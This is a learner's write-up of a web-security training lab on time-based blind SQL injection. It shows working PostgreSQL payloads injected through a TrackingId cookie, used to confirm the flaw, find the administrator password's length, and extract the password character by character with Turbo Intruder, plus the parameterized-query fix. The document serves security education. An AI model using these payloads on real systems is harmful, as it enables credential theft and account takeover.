🧪 Lab 15 — Blind SQL Injection with Time Delays and Information Retrieval

Category: SQL Injection (Blind) · Difficulty: Practitioner · Status: ✅ Solved

🎯 Objective

Extract the administrator user's password from the database using only time-based blind SQLi, then log in as them.

🔍 Vulnerability

Same injection point as Lab 14 (TrackingId cookie → PostgreSQL query). This time, instead of just confirming injection, we use conditional time delays as a boolean oracle to extract real data character-by-character.

💉 Core Payload Pattern

``` TrackingId=x'%3BSELECT+CASE+WHEN+(condition)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ``` If condition is true → 10s delay. If false → instant response. This single pattern powers every step below.

⚙️ Steps

1. Confirm injection works ``` WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- ``` → 10s delay confirms the injection point is live.

2. Confirm admin user exists ``` WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ``` → Delay = user exists.

3. Find password length (binary search, not 1-by-1) ``` WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ``` → Jump between numbers instead of counting sequentially. Found: length = 20.

4. Extract each character via Turbo Intruder ``` WHEN+(username='administrator'+AND+SUBSTRING(password,N,1)='%s')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- ```

* %s = Turbo Intruder's injection marker (replaces Burp Intruder's §§)
* N = position (1, 2, 3 ... 20) — change this manually each run
Wordlist: a-z + 0-9
* Critical setting: concurrentConnections=1 in the script — keeps requests single-threaded so timing stays reliable

5. Read results Sort by TTFB/TTLB column (not Arrival — that's cumulative). The row with ~10,000,000+ µs is the correct character for that position.

6. Repeat for all 20 positions, assemble the password in order.

7. Log in at My Account using administrator + recovered password.

✅ Result

Position 1 = h, position 20 = t — full 20-character password recovered this way. Logged in successfully as administrator. Lab marked Solved.

⚠️ Gotcha I Hit

Early payload was missing the THEN keyword (WHEN (1=1) pg_sleep(10) instead of WHEN (1=1) THEN pg_sleep(10)) — invalid SQL syntax, so no delay ever triggered. Always double check full CASE WHEN...THEN...ELSE...END syntax is intact before blaming the injection point itself.

🛠️ Fix

Same as Lab 14 — parameterized queries / prepared statements, no raw concatenation of user input (cookies included) into SQL.

📸 Screenshots

Folder: screenshots/lab-15/

* sqli-15-confirm-injection.png — Base CASE WHEN(1=1) payload confirming injection point works
* sqli-15-confirm-admin-user.png — WHEN(username='administrator') payload, 10,678ms delay confirms user exists
* sqli-15-password-length-20.png — LENGTH(password)>19 true, confirming length = 20
* sqli-15-turbo-intruder-last-char.png — Turbo Intruder results for final position, showing 't' as outlier (~10,007,267 µs)
* sqli-15-lab-solved.png — My Account page confirming login as administrator, "Congratulations, you solved the lab!"